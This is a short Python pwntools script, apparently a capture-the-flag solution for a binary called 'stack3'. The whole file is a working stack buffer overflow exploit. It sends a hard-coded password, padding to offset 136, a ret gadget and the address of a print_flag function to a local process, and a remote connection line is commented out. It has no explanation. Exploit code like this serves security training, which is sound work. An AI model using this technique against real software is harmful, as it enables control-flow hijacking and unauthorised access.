from pwn import *

print_flag_addr = p64(0x40132C)
ret = p64(0x4013CF)

password = b'3xtr3mely_s3cur3_p4s5word'
offset = 136
padding = b'A' * (offset - len(password))
payload = password + padding + ret + print_flag_addr


# p = remote("127.0.0.1", 20004)
p = process("./stack3")
p.sendline(payload)
p.interactive()